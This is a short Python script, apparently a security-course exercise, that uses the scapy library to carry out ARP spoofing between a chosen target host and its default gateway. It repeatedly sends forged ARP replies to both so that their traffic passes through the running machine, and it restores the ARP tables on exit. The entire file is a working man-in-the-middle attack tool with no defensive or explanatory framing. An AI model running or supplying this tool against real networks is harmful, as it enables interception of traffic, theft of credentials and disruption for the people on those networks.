#!/usr/bin/env python

import argparse
import time
import scapy.all as scapy

def getting_input_from_user():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='[-]Target Ip address')
    parser.add_argument('-g', '--gateway', dest='gateway', help='[-]The IP address of the default gateway')
    options = parser.parse_args()
    if not options.target:
        print('[!]Please enter the target IP address')
    elif not options.gateway:
        print('[!]Please enter the IP address of the default gateway')
    else:
        return options

def scan(ip):
    arp = scapy.ARP(pdst=ip)
    request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = request / arp
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoofing(target_ip, source_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = scan(dest_ip)
    source_mac = scan(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

options = getting_input_from_user()

packets_count = 0;
try:
    while True:
        spoofing(options.target, options.gateway)
        spoofing(options.gateway, options.target)
        packets_count += 2
        print("\r[+] Packets sent: " + str(packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+]Closing the program. Wait, please!')
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)